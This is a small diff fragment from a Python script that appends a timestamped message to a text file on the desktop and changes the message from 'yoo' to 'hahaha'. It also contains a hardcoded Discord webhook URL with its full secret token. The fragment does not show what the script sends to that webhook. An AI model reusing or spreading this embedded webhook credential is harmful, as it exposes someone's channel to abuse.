@@ -11,7 +11,7 @@ else:
     with open(f"{desktop}\\text.txt", "r+") as f:
         courent = f.read()
         # f.seek(0)
-        f.write(f"\n{datetime.datetime.now()}: yoo")
+        f.write(f"\n{datetime.datetime.now()}: hahaha")
         # f.truncate()
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/923148096341409792/7NwILPhR6Xbch5bh-LctPDECd8ywgobJH4sVHwrSfolBUpnFnb0d3mV4UEwX_cxgUAcH"
